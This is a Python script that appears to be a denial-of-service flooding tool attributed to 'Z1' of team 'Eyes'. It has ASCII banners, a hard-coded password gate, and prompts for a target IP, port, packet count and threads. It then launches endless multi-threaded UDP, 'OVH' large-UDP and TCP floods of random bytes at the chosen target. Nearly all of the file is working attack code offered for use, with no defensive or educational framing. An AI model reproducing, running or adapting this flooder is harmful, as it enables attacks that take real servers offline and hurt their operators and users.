#Eyes Team
#Rename?Pm Me

import random
import socket
import time
import threading
import getpass
import os

print("""\033[32m
────────────────────────────────────────
─────────────▄▄██████████▄▄─────────────
─────────────▀▀▀───██───▀▀▀─────────────
─────▄██▄───▄▄████████████▄▄───▄██▄─────
───▄███▀──▄████▀▀▀────▀▀▀████▄──▀███▄───
──████▄─▄███▀──────────────▀███▄─▄████──
─███▀█████▀▄████▄──────▄████▄▀█████▀███─
─██▀──███▀─██████──────██████─▀███──▀██─
──▀──▄██▀──▀████▀──▄▄──▀████▀──▀██▄──▀──
─────███───────────▀▀───────────███─────
─────██████████████████████████████─────
─▄█──▀██──███───██────██───███──██▀──█▄─
─███──███─███───██────██───███▄███──███─
─▀██▄████████───██────██───████████▄██▀─
──▀███▀─▀████───██────██───████▀─▀███▀──
───▀███▄──▀███████────███████▀──▄███▀───
─────▀███────▀▀██████████▀▀▀───███▀─────
───────▀─────▄▄▄───██───▄▄▄──────▀──────
──────────── ▀▀███████████▀▀ ────────────
────────────────────────────────────────
""")

password =str(input("\033[37m[!] \033[32mPassword \033[37m: \033[36m"))
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect Password [\033[32m•••\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect Password [\033[32m••\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect Password [\033[32m•\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect Password [\033[32m••\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect Password [\033[32m•••\033[37m]")
time.sleep(1.5)
os.system("clear")

if password == "#Eyes":
	print("\033[37mLogin Successfull [\033[32m!\033[37m]")
	time.sleep(2.5)
else:
	print("\033[37mWrong Password [\033[31m!\033[37m]")
	exit()
	
os.system("clear")
print("\033[37mAuthor : \033[32mZ1")
time.sleep(3)
os.system("clear")
print("\033[37mTeam : \033[32mEyes")
time.sleep(3)
os.system("clear")
print("\033[37mReady To Open Tools [\033[32m!\033[37m]")
time.sleep(3.5)
os.system("clear")

print("""\033[35m

█████████████████████████
█▄─▄▄─█▄─█─▄█▄─▄▄─█─▄▄▄▄█
██─▄█▀██▄─▄███─▄█▀█▄▄▄▄─█
▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀
███████████████████████████
█─▄─▄─█▄─▄▄─██▀▄─██▄─▀█▀─▄█
███─████─▄█▀██─▀─███─█▄█─██
▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀

         Author : \033[37mZ1
         \033[35mTeam : \033[37mΣYe$
         \033[35mSubscribe My \033[37mYoutube!
         \033[35mMethods : \033[37mUDP - OVH - TCP
         """)
  

choice =str(input("\033[35m[\033[37m!\033[35m] ΣYe$ | Methods \033[35m? \033[32m"))
ip =str(input("\033[35m[\033[37m!\033[35m] ΣYe$ | Ip Target ? \033[32m"))
port =int(input("\033[35m[\033[37m!\033[35m] ΣYe$ | Port Target ? \033[32m"))
times =int(input("\033[35m[\033[37m!\033[35m] ΣYe$ | Packets ? \033[32m"))
threads =int(input("\033[35m[\033[37m!\033[35m] ΣYe$ | Threads ? \033[32m"))

def udp():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mUDP \033[37m!!!".format(ip,port))
		except:
			print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mUDP \033[37m!!!".format(ip,port))
			
def ovh():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mOVH \033[37m!!!".format(ip,port))
		except:
			print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mOVH \033[37m!!!".format(ip,port))
			
def ovh2():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mOVH \033[37m!!!".format(ip,port))
		except:
			print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mOVH \033[37m!!!".format(ip,port))

def tcp():
	data = random._urandom(20179)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mTCP \033[37m!!!".format(ip,port))
		except:
			s.close()
			print("\033[37mPackets From ΣYe$ To Ip: \033[35m{} \033[37mPort : \033[35m{} \033[37mMethods: \033[35mTCP \033[37m!!!".format(ip,port))
			
for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()
		th = threading.Thread(target = ovh2)
		th.start()
	else:
		if choice == 'UDP':
			th = threading.Thread(target = udp)
			th.start()
	if choice == 'TCP':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'OVH':
		th = threading.Thread(target = ovh)
		th.start()
		th = threading.Thread(target = ovh2)
		th.start()